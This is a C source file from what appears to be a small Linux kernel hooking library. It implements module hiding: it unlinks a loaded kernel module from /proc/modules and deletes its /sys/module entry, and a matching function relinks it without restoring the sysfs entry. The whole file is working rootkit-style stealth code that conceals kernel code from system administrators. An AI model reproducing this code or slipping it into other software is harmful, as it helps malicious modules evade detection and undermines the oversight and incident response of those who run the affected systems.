/*
 * silkhook - miniature arm hooking lib
 * hide.c   - trivial process/module hiding
 *
 * SPDX-License-Identifier: MIT
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>

#include "hide.h"
#include "../../include/status.h"


/* ─────────────────────────────────────────────────────────────────────────────
 * module list manipulation
 *
 * remove the module from:
 *  (list_del)    /proc/modules
 *  (kobject_del) /sys/module/
 *
 * this doesn t' hide it from kallsyms
 * ───────────────────────────────────────────────────────────────────────────── */

int silkhook__hide_mod(struct module *mod, struct silkhook_hidden_mod *state)
{
	if (!mod || !state)
		return SILKHOOK_ERR_INVAL;

	if (state->hidden)
		return SILKHOOK_ERR_EXISTS;

	state->mod  = mod;
	state->prev = mod->list.prev;
	state->next = mod->list.next;

	list_del_init(&mod->list);

	kobject_del(&mod->mkobj.kobj);

	state->hidden = 1;

	return SILKHOOK_OK;
}

int silkhook__unhide_mod(struct silkhook_hidden_mod *state)
{
	if (!state || !state->mod)
		return SILKHOOK_ERR_INVAL;

	if (!state->hidden)
		return SILKHOOK_ERR_STATE;

	list_add(&state->mod->list, state->prev);

	state->hidden = 0;

	return SILKHOOK_OK;
}
